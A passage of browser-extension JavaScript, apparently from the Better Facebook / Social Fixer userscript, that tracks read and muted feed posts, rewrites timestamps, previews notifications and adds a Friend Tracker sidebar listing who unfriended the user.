							return QS(o,feedCommentContainerSelector);
						}
						// Get the count of how many comments a post has
						var comment_selector = '.uiUfiComment,.UFIComment';
						function get_post_comment_count(o,cnc) {
							var cc = o.getAttribute('comment_count');
							if (cc) {
								return cc;
							}	
							var c = get_comment_container(o);
							var new_comment_count = 0;
							if (c) {
								if ( /view all ([,.\d]+) comments/i.test(c.innerHTML) ) {
									var view_all_count = +(RegExp.$1.replace(/[,.]/g,""));
									// If a ChildNodeCount is passed, compare it to the current CNC to see if the "view all" count is unreliable
									if (typeof cnc!="undefined") {
										var comments = QSA(c,comment_selector);
										if (comments && comments.length>cnc) {
											// We need to do some math!
											// # new comments = new CNC - old CNC
											new_comment_count = +(comments.length - cnc);
										}
									}
									return view_all_count + new_comment_count;
								}
								var pager_row = QS(c,'.UFIPagerRow');
								if (pager_row) {
									var counter = QS(pager_row,'.rfloat,.fcg');
									if (counter) {
										var count = match(counter.innerHTML,'/\s+\s+of\s+(\d+)/');
										if (count) { 
											return count;
										}
									}
								}
								var comments = QSA(c,comment_selector);
								if (comments && comments.length>0) {
									return comments.length;
								}
								return 0;
								//return c.childNodes.length || 0;
							}
							var ftl = QS(o,'.feedback_toggle_link .uiBlingBox span.text ~ span.text');
							if (ftl && ftl.innerHTML) {
								var count = +ftl.innerHTML;
								if (count && !isNaN(count)) {
									return count;
								}
							}
							return 0;
						}

						// Mark an individual post as "read"
						function mark_post_read(o,save,func,store_undo) {
							if (typeof save!="boolean") { save=false; }
							if (typeof store_undo!="boolean") { store_undo=true; }
							var t = time();
							var fbid = o.getAttribute('fbid');
							if (!fbid) {
								fbid = getFbid(o,getData(o,"data-ft"));
							}
							if (fbid && !hasClass(o,"bfb_duplicate")) {
								var post_data = options.get('story_data.'+fbid) || {};
								// Store this post in the "undo" buffer
								if (store_undo) {
									var undo_post = {type:"read", post:o, "fbid":fbid, "post_data":JSON.stringify(post_data) };
									if (save) { undo_posts=[ undo_post ]; }
									else { undo_posts.push(undo_post); }
								}
								
								post_data.read = t;

								var cc = post_data.cc || {};
								cc.c = get_post_comment_count(o,post_data.cnc);
								if (post_data.cnc) {
									delete post_data['cnc'];
								}
								cc.t = t;
								if (cc.nt) { delete cc['nt']; }
								if (cc.nc) { delete cc['nc']; }
								post_data.cc = cc;
								options.set('story_data.'+fbid,post_data,save,func);
								addClass(o,"bfb_read");
								removeClass(o,"bfb_new_comments");
								update_tab_count(o);
							}
						}
						function mute_post(o,save) {
							var fbid = getFbid(o,getData(o,"data-ft"));
							var post_data = options.get('story_data.'+fbid) || {};
							var undo_post = {type:"mute", post:o, "fbid":fbid, "post_data":JSON.stringify(post_data) };
							if (save) { undo_posts=[ undo_post ]; }
							else { undo_posts.push(undo_post); }

							options.set('story_data.'+fbid+'.no_comments',true,false);
							mark_post_read(o,false,null,false);
							addClass(o,"bfb_muted");
							update_tab_count(o);
							options.save();
						}

						function fixStories(o,isPageOrProfile,isGroupWall) { 

							// We are processing a live list. If we move a post to a tab, that changes the list!
							// So instead, copy all posts to an array first, then process each one
							if (o && o.length) {
								var posts = [];
								for (var i=0; i<o.length; i++) {
									posts.push(o[i]);
								}

								for (var i=0; i<posts.length; i++) {
									fixStory(posts[i],isPageOrProfile,isGroupWall);
								}
								posts = null;
							}

						}
						function findStoriesInContainer(container) {
							if (container && container.querySelectorAll) {
								return QSA(container,storySelector);
							}
							return null;
						}
						// ==================================================================
						// Fix timestamps on posts
						// ==================================================================
						var remove_current_year = new RegExp(", "+current_year);
						function fix_timestamps(o) {
							QSA(o,'abbr[data-utime][title]',function(a){ 
								if ($('MessagingDashboard')) { return; }
								if (hasClass(a,'bfb_timestamp')) { return; }
								var data_utime = a.getAttribute('data-utime');
								if (data_utime=="0") { return; } 
								var new_label = (""+a.title).replace(remove_current_year,"");
								if (a.innerHTML.indexOf("ago")>0) {
									try {
										var now = new Date();
										var d = new Date(data_utime*1000);
										if ( ((now.getTime()-d.getTime()) < (days*1)) && (now.getDate()==d.getDate()) ) {
											new_label = new_label.replace(/.+ /,'');
										}
									} catch(e) { }
									new_label += " ("+a.innerHTML+")";
								}
								html(a,"");
								append(a,document.createTextNode(new_label));
								removeClass(a,"timestamp");
								removeClass(a,"livetimestamp");
								addClass(a,"bfb_timestamp");
							});
						}
						if (options.get("fix_timestamps") && document.body) {
							fix_timestamps(document.body);
						}

						// ==================================================================
						// Notifications
						// ==================================================================
						var notification_clicked = false;
						on_page_change(function() {
							log('[notifications]','notification_clicked = false');
							notification_clicked = false;
						});
						subscribe('jewel/count-updated',function(msg,o){
							log('[notifications]','jewel/count-updated',o);
							if (o.jewel && o.jewel=="notifications") {
								log('[notifications]','Adding handler for notifications flyout');
								onIdLoad('fbNotificationsFlyout',function(notifications) {
									log('[notifications]','#fbNotificationsFlyout loaded',notifications);
									if (!unsafeWindow.presenceNotifications) { return false; }
									var pinned = false;
									// PIN NOTIFICATIONS
									if (options && options.get('pin_notifications')) {
										notifications.style.position="fixed";
										notifications.style.top="40px";
										notifications.style.right="0px";
										notifications.style.display="block";
										notifications.style.left="auto";
										notifications.style.maxHeight=(window.innerHeight-25)+'px';
										notifications.style.overflow="auto";
										notifications.style.zIndex=9998;
										var w = options.get('pin_notifications_width');
										if (w && w!="") {
											notifications.style.width=w;
										}
										addClass(QS(document,'html'),'pin_notifications');
										if (hasClass(QS(document,'html'),'sidebarMode')) {
											notifications.style.right="208px";
										}
										pinned = true;
									}
									else if (options && options.get('pin_notifications_right_panel')) {
										var rc = QS(document,'#rightCol');
										if (rc && !is_timeline()) {
											insertFirst(rc,notifications);
											pinned=true;
											addClass(QS(document,'html'),'pin_notifications_right_panel');
										}
									}
									if (pinned) {
										removeClass(notifications,'toggleTargetClosed');
										unsafeWindow.presenceNotifications.fetch();
										unsafeWindow.presenceNotifications.markRead(true);
									}

									if (options && options.get('show_notification_previews2')) {
										// Add hovering features
										var retrieving_preview = null;
										var preview_top=0, preview_left=0;
										var preview_window = null;
										var preview_content = {};
										var preview_visible = false;
										var preview_loading = false;
										var preview_delay = null;
										var hide_notif_preview = function() {
//											log('[notifications]','hide');
											if (preview_window!=null) {
												preview_window.style.display="none";
											}
											if (preview_delay!=null) { 
												clearTimeout(preview_delay);
												preview_delay = null;
											}
											preview_visible = false;
											retrieving_preview = null;
											if (preview_loading) {
												log('[notifications]','(hide) setting preview_loading to false');
												preview_loading = false;
											}
										}
										var show_notif_preview = function(content,loading) {
											log('[notifications]','show');
											if (preview_window==null) {
												preview_window = document.createElement("div");
												preview_window.className="bfb_notif_preview bfb_window_height";
												append(document.body,preview_window);
											}
											html(preview_window,content);
											if (preview_visible) {
												preview_window.style.display="block";
											}
											if (preview_delay!=null) { 
												clearTimeout(preview_delay);
												preview_delay = null;
											}
											position_notif_preview();
											if (typeof loading=="boolean" && loading!=preview_loading) { 
												log('[notifications]','(show) setting preview_loading to '+loading); 
												preview_loading = loading; 
											}
										}
										var append_notif_preview = function(content) {
											if (preview_window) {
												appendhtml(preview_window,content);
												if (preview_visible) {
													preview_window.style.display="block";
												}
												position_notif_preview();
											}
										}
										var position_notif_preview = function() {
											if (preview_window!=null) {
												preview_window.style.top = preview_top+10+"px";
												if (preview_left+preview_window.offsetWidth>document.body.offsetWidth) {
													preview_window.style.left = preview_left-10-preview_window.offsetWidth+"px";
												}
												else {
													preview_window.style.left = preview_left+10+"px";
												}
											}
										}
										var scrollhandler = function(e) {
											if (preview_window!=null && preview_visible && !preview_loading) {
												log('[notifications]','scrolling preview instead',preview_window, preview_loading);
												var distance = e.detail || e.wheelDelta || 0;
												if (e.wheelDelta) { 
													var newScrollTop = preview_window.scrollTop + (-(distance/3));
												}
												else {
													var newScrollTop = preview_window.scrollTop - (-(distance/3))*20;
												}
												if (newScrollTop<0) { newScrollTop = 0; }
												preview_window.scrollTop = newScrollTop;
												e.preventDefault();
												e.stopPropagation();
											}
											else {
												hide_notif_preview();
											}
										}
										var notification_clicked = false;
										notifications.addEventListener('click',function(){notification_clicked=true;hide_notif_preview();},true);
										bind(notifications,'DOMMouseScroll',scrollhandler );
										bind(notifications,'mousewheel',scrollhandler );
										bind(notifications,'mousemove',function(e) {
											if (notification_clicked){return;}
											var t = target(e);
											if (!t) { return; }
											preview_top = e.pageY;
											preview_left = e.pageX;
											while (t.tagName!="A" && t.id!="jewelNotifs" && t.parentNode) {
												t=t.parentNode;
											}
											if (!t) { return; }
											if (t.tagName && t.tagName=="A") {
												var url = t.href.replace(/http:/, protocol);
												var type = null;
												if (url.indexOf("photo.php")>-1) { type="photo"; }
												if (url.indexOf("permalink.php")>-1 || url.indexOf("/posts/")>-1 || url.indexOf("notif_t=feed_comment")>-1) { type="permalink"; }
												if (type) {
													if (retrieving_preview!=url) {
														hide_notif_preview();
														retrieving_preview = url;
														preview_delay = (function(url){ return delay(700,function() {
															log('[notifications]','new url',url);
															preview_visible = true;
															if (typeof preview_content[url]=="undefined") {
																var preview_html = '<div class="bfb_notif_preview_message">Use your scroll wheel to scroll down if necessary</div>';
																show_notif_preview("Loading preview...",true);
																if (type=="photo") {
																	fetch_content_in_iframe(url,'content',function(content) {
																		show_notif_preview("Loading preview......",true);
																		if (content) {
																			var img = content.querySelector('#fbPhotoImage');
																			var comments = content.querySelector('#fbPhotoPageFeedback');
																			if (img) {
																				preview_html += '<img class="bfb_notif_photo_preview" src="'+img.src+'" style="max-height:'+(window.innerHeight-300)+'px;">';
																			}
																			if (comments) {
																				preview_html += '<br>'+comments.innerHTML;
																			}
																			preview_content[url] = preview_html;
																			if (url==retrieving_preview) {
																				show_notif_preview(preview_html,false);
																			}
																		}
																		else if (url==retrieving_preview) {
																			show_notif_preview("Error retrieving preview",false);
																		}
																		else {
																			show_notif_preview("Error!",false);
																		}
																	});
																}
																else if (type=="permalink") {
																	fetch_content_in_iframe(url,'content',function(ca) {
																		append_notif_preview('<br>Content retrieved...');
																		if (ca) {
																			var post = ca.querySelector('.storyContent');
																			if (post) {
																				preview_html += post.innerHTML;
																				preview_content[url] = preview_html;
																				if (url==retrieving_preview) {
																					show_notif_preview(preview_html,false);
																				}
																			}
																			else {
																				append_notif_preview("<br>Couldn't find content");
																			}
																		}
																		else if (url==retrieving_preview) {
																			show_notif_preview("Error retrieving preview",false);
																		}
																		else {
																			append_notif_preview("<br>Couldn't find content");
																		}
																	});
																}
															}
															else { show_notif_preview(preview_content[url],false); }
														})})(url);
													}
													else { position_notif_preview(); }
												}
												else { 
													hide_notif_preview(); 
												}
											}
										});
										bind(notifications,'mouseout',function(e) {
											var t = target(e);
											if (!t) { return; }
											while (t.tagName!="A" && t.id!=notifications.id && t.parentNode) { t=t.parentNode; }
											if (!t||t.tagName!="A") { preview_visible=false; hide_notif_preview(); }
											else {
												// Check to see if we've moved quickly to something outside our container
												if (t=e.relatedTarget) {
													while (t.id!=notifications.id && t.parentNode) { t=t.parentNode; }
													if (!t || t.id!=notifications.id) {
														// We've gone outside the container, so hide
														preview_visible=false;
														hide_notif_preview();
													}
												}
											}
										});
									}
								});
							}
						});

						function getStream() {
							var s;
							if (processProfiles) {
								if (s=$('profile_minifeed')) { 
									return s; 
								}
							}
							if (processGroups) {
								if (s=QS(document,'#pagelet_group_mall ul.uiStream')) { 
									return s; 
								}
							}
							if (s=$('home_stream')) { return s; }
							s = QSA(document,streamContainerSelector);
							if (s && s.length) { return s[0]; }
							return null;
						}
						
						var bad_fbid_sty_types = array_to_object(split('15,60,10,313,263,316,285,7,8,116,278,62,3,77,9,55,56,245,-1,257,400,447,38,172,65,283,247,463,63,347,12,161',',')) || {};
						function getFbid(o,props) {
							var fbid = null;
							var utime = "";
							// Use the time of the post to uniquely identify different posts pointing to the same url
							QS(o,'abbr[data-utime]',function(abbr) {
								var data_utime = abbr.getAttribute('data-utime');
								if (data_utime) { utime = "@"+data_utime; }
							});
							// Look for the link to the story first, it is most reliable
							QS(o,'.uiStreamSource a,.timelineTimestamp a.uiLinkSubtle, a.uiLinkSubtle > abbr[data-utime]',function(a) {
								try {
									if (a&&a.tagName&&a.tagName=="ABBR"){a=a.parentNode;}
									var href = a.getAttribute('href');
									fbid = match(href,/fbid=(\d+)/);
									if (fbid && fbid>1000) {
										return fbid+utime;
									}
									fbid = match(href,/posts\/(\d+)$/);
									if (fbid && fbid>1000) {
										return fbid+utime;
									}
									if (href.indexOf("/mobile/?v")==-1 && !a.getAttribute('data-appname')) {
										// The word "mobile" links to the mobile app, which is common between posts to the album Mobile Uploads
										fbid = href+utime;
									}
								} catch(e) { }
							});
							if (fbid && fbid>1000) {
								return fbid+utime;
							}
							// Some stories change their fbid, so we need to remembers the actrs involved to uniquely identify it
							var prop_keys_exist = false, key=null;
							if (props) { for (key in props) { prop_keys_exist=true; } }
							if (props && prop_keys_exist && (typeof props.sty=="undefined" || props.sty==-1 || typeof bad_fbid_sty_types[props.sty]!="undefined")) {
								var found_prop = false;
								var id = "sty"+(props.sty||-1);
								// Return the actrs instead, which can unfortunately be in random, comma-separated order
								if (props.actrs && props.actrs.split) {
									var actrs = props.actrs.split(/\s*,\s*/).sort( function(a,b) { return (a>b)?1:-1; } ).join(",");
									id+= ":"+actrs;
								}
								else {
									match(o.className,/aid_\d+/g,function(m) {
										id+=":"+m.substring(4);
									});
								}
								if (props.object_id) {
									id+=":"+props.object_id; found_prop = true;
								}
								if (props.pub_time) {
									id+=":"+props.pub_time; found_prop = true;
								}
								if (!found_prop && props.mf_story_key) {
									id+=":"+props.mf_story_key;
								}
								return id;
							}
							if (props && props.fbid) { 
								return props.fbid; 
							}
							fbid = getStoryProperty(o,'fbid');
							if (!fbid && o.id) {
								var parts = o.id.split("_");
								if (parts) {
									fbid = parts[parts.length-1];
								}
							}
							if (fbid && fbid>1000) {
								return fbid;
							}
							return null;
						}
						function process_visible_posts(func) {
							var stream = getStream();
							if (stream) {
								removeClass(stream,"bfb_show_all");
								var posts = getPostList();//findStoriesInContainer(stream);
								for (var i=0, L=posts.length; i<L; i++) {
									var o = posts[i];
									if (!hasClass(o,'bfb_hidden') && (!hasClass(o,'bfb_read') || hasClass(o,'bfb_new_comments'))) {
										func(o);
									}
								}
							}
						}
						function markRead(func) {
							undo_posts = [];
							process_visible_posts(function(o) {
								mark_post_read(o,false);
							});
							options.save(func);
							scroll_to_top();
						}
						function mute_all() {
							undo_posts = [];
							process_visible_posts(function(o) {
								mute_post(o,false);
							});
							options.save();
							scroll_to_top();
						}
						function toggle_show_all(ev) {
							var s,t = target(ev);
							var e = getStream();
							if (is_timeline()) {
								e = $('timeline_tab_content');
							}
							if (hasClass(e,"bfb_show_all")) {
								removeClass(e,"bfb_show_all");
								s="Show Hidden Posts";
							}
							else {
								addClass(e,"bfb_show_all");
								s="Hide Read Posts";
							}
							if (t) {
								html(t,s);
								t.value=s;
							}
							update_tab_count(e);
						}
						function createSidebarSection(o) {

							var d = el('div','better_facebook_sidebar_section');
							d.id="pagelet_"+o.id;
							
							// Check to see if it should be collapsed by default
							var pagelets = options.get('pagelet_collapsed');
							if (pagelets) {
								if (typeof pagelets[d.id]!="undefined" && pagelets[d.id]) { d.className="bfb_pagelet_closed"; }
							}
							var h = ''+
							'<div>'+
						'		<div class="mbl">'+
						'			<div class="uiHeader uiHeaderBottomBorder uiHeaderTopAndBottomBorder uiSideHeader mbm mbs pbs">'+
						'				<div class="clearfix uiHeaderTop">'+
						'					<div>'+
						'						<h4 class="uiHeaderTitle pagelet_title">%title%</h4><span id="%id%_title_after"></span>'+
						'					</div>'+
						'				</div>'+
						'			</div>'+
						'			<div class="UIRequestBox phs">'+
						'				<div id="%id%" class="UIImageBlock clearfix UIRequestBox_Request UIRequestBox_RequestFirst UIRequestBox_RequestOdd">'+
						'					%content%'+
						'				</div>'+
						'			</div>'+
						'		</div>'+
							'</div>';
							html( d, _template( h, o ) );
							var dd = d.getElementsByClassName('uiHeaderTop')[0];
							if (dd) {
								if (o.links) {
									o.links.forEach( function(link,i) {
										var a = el('a','bfb_sidebar_header_link',{href:'#'},{click:link.linkonclick});
										html(a,link.linktext);
										var nd = el('div','uiTextSubtitle uiHeaderActions rfloat');
										append(nd,a);
										insertFirst(dd,nd);
									} );
								}
								if (o.close_pref && !o.close_func) {
									o.close_func = function(){
										var close_msg = o.close_msg || "Are you sure you want to remove this widget?";
										if (confirm(close_msg)) {
											options.set(o.close_pref,false);
											removeChild(d);
										}
									};
								}
								if(o.close_func) {
									var a = el('a','bfb_sidebar_header_link',{href:'#'},{'click':o.close_func});
									html(a,'<img src="'+x_img+'">');
									var nd = el('span','uiTextSubtitle uiHeaderActions rfloat');
									append(nd,a);
									insertFirst(dd,nd);
								}
							}

							return d;
						}

						// When the page is first loaded, process the stuff that is there
						onDOMContentLoaded(function() {
							fixStories( findStoriesInContainer(QS(document,'#home_stream')), false, false );
							if (processProfiles) {
								fixStories( findStoriesInContainer($('profile_minifeed')), true, false );
								fixStories( findStoriesInContainer(QS(document,'#timeline_tab_content')), true, false );
							}
							if (processGroups) {
								fixStories( findStoriesInContainer($('pagelet_group_mall')), false, true );
							}
						});
						
						// When the streams are unloaded, reset counters
						on_page_change(function() {
							post_array = {};
							post_hash = {};
							post_counter = 0;
						});

						// RIGHT COLUMN CONTENT
						// ====================
						// Put a "close" link on all side panels and hide them if already closed
						var current_hidden = options.get('right_panels_hidden');
						var hidden_sidepanels = split(current_hidden,';');
						onSelectorLoad('#rightCol .uiSideHeader h5, #rightCol .uiSideHeader h6, #pagelet_ego_pane .uiSideHeader h5, #pagelet_ego_pane .uiSideHeader h6, #MessagingNetegoSidebar .uiSideHeader h5, #MessagingNetegoSidebar .uiSideHeader h6, .UIStandardFrame_SidebarAds .uiSideHeader h5, .UIStandardFrame_SidebarAds .uiSideHeader h6, #rightCol h3.uiHeaderTitle',function(o) {
							var sidebar_title = o.innerHTML;
							QS(o,'a > span',function(span) {
								sidebar_title = span.innerHTML;
							});
							sidebar_title = trim(sidebar_title.replace(/(You\s*and\s*).*/gi,"$1..."));
							sidebar_title = sidebar_title.replace(/<.*/g,'');
							sidebar_title = sidebar_title.replace(/\s*\(\d+\)/g,'');
							var container = parent(o,'uiSideHeader,.uiHeader');
							var header_top = getParentByClass(o,'uiHeaderTop');
							if (container) { 
								var mbl = getParentByClass('mbl'); 
								if (mbl) { container=mbl; }
								else {
									var mbm = getParentByClass('mbm'); 
									if (mbm) { container = mbm; }
									else { container = container.parentNode; }
								}
							}
							if (container && hidden_sidepanels.indexOf(sidebar_title)>-1) {
								hide(container);
							}
							else if (container) {
								if (header_top) {
									var existing_close = QS(header_top,'.bfb_sidebar_close');
									if (existing_close) { 
										// If there is a close icon already, remove it and add a new one
										removeChild(existing_close.parentNode);
									}
									var a = el('a','bfb_sidebar_header_link bfb_sidebar_close',{href:'#',title:'Click to hide this panel'},{click:function(){
										if(confirm('Are you sure you want to hide the panel labeled \''+sidebar_title+'\'?\n(You can choose to show it again in Options)')) {
											hidden_sidepanels.push(sidebar_title);
											options.set('right_panels_hidden',hidden_sidepanels.join(';'),true,function() {
												hide(container);
											});
										}
									}});
									html(a,'<img src="'+x_img+'">');
									var nd = el('div','uiTextSubtitle uiHeaderActions rfloat');
									append(nd,a);
									insertFirst(header_top,nd);
									
									// Add an 'expand' msg
									if (!QS(header_top,'.bfb_sidebar_header_expand')) {
										insertFirst(header_top,el('span','bfb_sidebar_header_expand rfloat',null,null,'(click to expand)',{'display':'none'}));
									}
								}
							}
						});	
						
						onSelectorLoad('#rightCol',function(o) {
							var feed_right_column = o;
							
							// TODO!!!
							QS(feed_right_column,'.home_right_column',function(oo) {
								feed_right_column = oo;
							});
							QS(feed_right_column,'.rightColumnWrapper',function(oo) {
								feed_right_column = oo;
							});
							if ($('pagelet_chbox')!=null) { feed_right_column=$('pagelet_chbox').parentNode; }
							else if ($('pagelet_adbox')!=null) { feed_right_column=$('pagelet_adbox').parentNode; }
						
							// If the "fixed" right panel exists, don't add panels
							if (QS(feed_right_column,'.fixedAux')) { return; }
							
							// If on Timeline, don't add panels
							if (is_timeline()) { return; }

							var title,id,pagelet,pagelet_id,pagelets = options.get('pagelet_collapsed');
							if (options && options.get('pagelet_toggle')) {
								QSA(o,"h6,h5,h4,h3",function(o2) { 
									if (hasClass(o2,'accessible_elem')) { return; }
									o2.title="Click to expand/collapse this pagelet"; 
									// Decide whether to hide this section by default
									if (pagelets) {
										pagelet = o2;
										title = o2.innerHTML;
										QS(o2,'a > span',function(span) {
											title = span.innerHTML;
										});
										while (pagelet=pagelet.parentNode) {
											if (hasClass(pagelet,'ego_section')) {
												pagelet_id = title; break;
											}
											if (pagelet.id=="pagelet_right_sidebar" || pagelet.id=="rightCol") {
												pagelet = null; break;
											}
											if(pagelet.id && (pagelet.id.indexOf("pagelet_")==0 || pagelet.id=="ego_pane")) {
												pagelet_id = pagelet.id; break;
											}
										}
										if (pagelet && pagelet_id && pagelet_id!="pagelet_ego_pane") {
											if (typeof pagelets[pagelet_id]!="undefined" && pagelets[pagelet_id]) {
												addClass(pagelet,"bfb_pagelet_closed");
											}
										}
									}
								});
								
								// Handle clicks on pagelet titles
								bind(o,'click',function(e) {
									var e = target(e);
									if (e.tagName=="H6" || e.tagName=="H5" || e.tagName=="H4" || e.tagName=="H3" || hasClass(e,'bfb_sidebar_header_expand')) {
										var pagelet = e;
										var pagelet_id = null;
										var title = pagelet.innerHTML;
										while (pagelet=pagelet.parentNode) {
											if (hasClass(pagelet,'ego_section')) {
												pagelet_id = title; break;
											}
											if (pagelet.id=="pagelet_right_sidebar" || pagelet.id=="rightCol") {
												pagelet = null; break;
											}
											if(pagelet.id && (pagelet.id.indexOf("pagelet_")==0 || pagelet.id=="ego_pane")) {
												pagelet_id = pagelet.id; break;
											}
										}
										if (pagelet && pagelet_id) {
											toggleClass(pagelet,"bfb_pagelet_closed");
											options.set("pagelet_collapsed."+pagelet_id,hasClass(pagelet,"bfb_pagelet_closed"));
										}
									}
									// Allow collapsing of Notifications if put into right col
									if (e.tagName=="H3") {
										var pagelet = e.parentNode.parentNode.parentNode.parentNode;
										if ("fbNotificationsFlyout"==pagelet.id) {
											toggleClass(pagelet,"bfb_pagelet_closed");
											options.set("pagelet_collapsed."+pagelet.id,hasClass(pagelet,"bfb_pagelet_closed"));
										}
									}
								});
							}
							
							// Friend Tracker
							// --------------
							(function() {
								try {
									if (options && options.get('show_friend_tracker') && !is_timeline()) {
										var clear = function() {
											options.set('friend_tracker.unfriended',{},false);
											options.set('friend_tracker.refriended',{},false);
											options.save(function() {
												loadContent();
											});
										}
										var loadContent = function(force) {
											var t = time();
											var loaded = false;
											html( $('better_fb_friend_tracker_pagelet'), "Loading..." );
											setTimeout(function() {
												if (loaded) { return; }
												var pagelet = $('better_fb_friend_tracker_pagelet');
												if (pagelet) {
													append(pagelet, minimessage(
														'Why is Friend Tracker stuck on "Loading"?<br>&nbsp;&nbsp;&nbsp;<a style="text-decoration:underline;" href="http://socialfixer.com/faq.php#3rdpartycookies" target="_blank">See the FAQ!</a>'
														,null
														,{marginTop:'8px',borderColor:'#999'}
													));
												}
												
											},7*seconds);
											var dirty = false;
											get_remote_content('friendslist', function(result) {
												var friends = options.get('friend_tracker') || {'friends':{},'unfriended':{}};
												if (typeof friends.friends=="undefined") { friends.friends={}; }
												if (typeof friends.unfriended=="undefined") { friends.unfriended={}; }
												if (typeof friends.refriended=="undefined") { friends.refriended={}; }
												var old_friends = friends.friends;
												var unfriended = friends.unfriended;
												var refriended = friends.refriended;
												var count = 0;
												var friend_list = parse(result.replace(/for\s*\(\s*\;\s*\;\s*\)\s*\;/,''),"Friend Tracker");
												if (!friend_list.payload || !friend_list.payload.entries) { return false; }
												friend_list = friend_list.payload.entries;
												if (friend_list && friend_list.length>5) {
													loaded = true;
													var current_friends = {};
													for (i=0;i<friend_list.length;i++) {
														if (friend_list[i].type=="user") { // only users
															count++;
															var id = friend_list[i].uid;
															if (id==userid) { continue; } // Ignore ourself
															var name = friend_list[i].text;
															var f = {'name':name,'added':t};
															// User wasn't my friend before
															if (typeof old_friends[id]=="undefined") {
																// Add them into the list of my friends!
																old_friends[id] = f;
																dirty = true;
															}
															// Maintain a list of all current friends
															current_friends[id] = f;
															// If a friend was unfriended but is now a friend, they are re-friended!
															if (typeof unfriended[id]!="undefined") {
																refriended[id] = unfriended[id];
																refriended[id].refriended = t;
																refriended[id].id = id;
																delete unfriended[id];
																dirty = true;
															}
														}
													}

													// Now loop through all my old_friends, to see if they no longer exist in current_friends
													var h = "";
													for (var id in old_friends) {
														if (id==userid) { continue; } // Ignore ourself
														if (typeof current_friends[id]=="undefined") {
															// They unfriended you! Bastards!
															unfriended[id] = old_friends[id];
															unfriended[id].deleted = t;
															unfriended[id].id = id;
															delete old_friends[id];
															
															// Forcefully delete the refriend, if it exists
															delete refriended[id];
															
															dirty = true;
														}
													}
													var days = options.get('friend_tracker_duration') || 3;
													var duration = 1000*60*60*24*days;
													var unfriend_array = object_to_array( unfriended, 'deleted', true );
													for (var i=0; i<unfriend_array.length; i++) {
														var f = unfriend_array[i];
														var id = f.id;
														if (t-f.deleted > duration ) {
															delete unfriended[id];
															dirty = true;
														}
														else {
															if (!h) {
																h = "You are <span class=\"bfb_friend_tracker_unfriended\">no longer friends</span> with:";
															}
															h += '<div>&nbsp;&nbsp;&nbsp;<a href="/profile.php?id='+id+'" target="_blank" class="sfx_unfriend_name">'+f.name+'</a> <span class="'+timestampClass+'">'+ago(f.deleted,t,true)+' <span class="sfx_unfriend_reason"></span></span></div>';
														}
													}
													var refriend_array = object_to_array( refriended, 'refriended', true );
													var refriended_header = false;
													for (var i=0; i<refriend_array.length; i++) {
														var f = refriend_array[i];
														var id = f.id;
														if (t-f.refriended > duration ) {
															delete refriended[id];
															dirty = true;
														}
														else {
															if (!h || !refriended_header) {
																refriended_header = true;
																h += "You have been <span class=\"bfb_friend_tracker_friended\">re-friended</span> by:<br>";
															}
															h += '&nbsp;&nbsp;&nbsp;<a href="/profile.php?id='+id+'" target="_blank">'+f.name+'</a> <span class="'+timestampClass+'">'+ago(f.refriended,t)+'</span><br>';
														}
													}
													var pagelet = $('better_fb_friend_tracker_pagelet');
													if (h) {
														html( pagelet, h );
														if (options.get('friend_tracker_show_note')) {
															append(pagelet, minimessage(
																'Why are these friends listed here?<br>&nbsp;&nbsp;&nbsp;<a style="text-decoration:underline;" href="http://SocialFixer.com/faq.php#friendtracker" target="_blank">Learn More!</a>'
																,function() {
																	options.set('friend_tracker_show_note',false);
																}
																,{marginTop:'8px',borderColor:'#999'}
															));
														}
														// Request each unfriend to see if they are no longer friends or just account error
														log("[friend tracker]","Checking for friend statuses...");
														QSA(pagelet,'.sfx_unfriend_name',function(a) {
															log("[friend tracker]","Checking on status of "+a.innerHTML);
															simple_ajax(a.href,function(res) {
																log("[friend tracker]","Response status for "+a.href+":"+res.status);
																if (res.status==404) {
																	log("[friend tracker]","Account inactive - "+a.href);
																	QS(a.parentNode,'.sfx_unfriend_reason',function(span) { html(span,'(account inactive)'); });
																}
															});
														});
													}
													else {
														html( pagelet, "" );
														if (options.get('show_friend_tracker_no_activity_msg')) {
															append( pagelet, minimessage("No activity (When you are unfriended, names will show up here)"
																,function() {
																	options.set('show_friend_tracker_no_activity_msg',false);
																}
																,{borderColor:'#999'}
															));
														}
													}
													
													// Update total friend count
													html( $('better_fb_friend_tracker_pagelet_title_after'), ' (<a href="http://socialfixer.com/blog/2012/06/18/why-has-your-friend-count-increased-heres-why/" data-hover="tooltip" target="_blank" title="Does this number look wrong? click here for an explanation!">'+(count-1)+'</a>)' );
													
													// Finally, save the details!
													if (dirty) {
														options.set('friend_tracker',friends);
													}
												}
											},null,force);
										}
										
										// Only insert if it doesn't already exist!
										if ($('better_fb_friend_tracker_pagelet')==null) {
											// A "Friend Tracker" sidebar will notify if anyone unfriended you
											var section = createSidebarSection({ title:'Friend Tracker',content:'Loading...',id:'better_fb_friend_tracker_pagelet',close_pref:'show_friend_tracker',links:[ {linktext:'Clear',linkonclick:clear }, {linktext:'Refresh',linkonclick:function(){loadContent(true);} } ] } );
											// If the "remidners" section exists, insert after that
											var reminders = $('pagelet_reminders');
											if (reminders) {
												insertAfter(section, reminders);
											}
											else {
												insertAtPosition( feed_right_column, section, 2 );
											}
											onIdLoad('better_fb_friend_tracker_pagelet', function(){ setTimeout(loadContent,10); });
										}
									}
								} catch(e) { add_error("Friend Tracker Error",e.toString()); }
							})();

							// =================================================
							// Show Ajax-Loaded Right Panels
							// =================================================
							function pagelet_box(container,pagelet_id,title,content,sidebar_options) {
								// Render any options
								if (options) {
									options.options.forEach(function(opt,i) {
										if (opt.name) {
											content = content.replace( new RegExp("%"+opt.name+"%","g"), options.renderOption(opt));
										}
									});
								}
								var sidebar_o = { 
									'title':title,
									'content':content,
									'id':pagelet_id
								};
								if (sidebar_options) {
									for (var o in sidebar_options) { sidebar_o[o] = sidebar_options[o]; }
								}
								try {
									var section = createSidebarSection(sidebar_o);
								} catch(e) { alert("Exception in createSidebarSection: " +e ); }

								insertFirst( container, section );
								// Attach functionality to the inserted action buttons/links
								try {
									QSA(section,'.bfb_pagelet_action',function(o) {
										bind(o,'click',function(e) {
											try {
												var pref,o=target(e);
												var data = o.getAttribute('data');
												var stopPropagation = true;
												var preventDefault = false;
												if (data) {
													data = data.replace(/([\{\,])\s*(.*?)\s*:/g,'$1"$2":');
													data = parse(data);
													if (data) {
														try {
															if (typeof data.setpref!="undefined") {
																for (pref in data.setpref) { 
																	var val = data.setpref[pref];
																	if (val==="true") { val=true; }
																	if (val==="false") { val=false; }
																	options.set(pref,val,false); 
																}
															}
															if (data.saveprefs) {
																QSA(section,'input',function(input) {
																	if (input.type=="checkbox") {
																		options.set(input.name,input.checked,false);
																	}
																	else if (input.type=='text') {
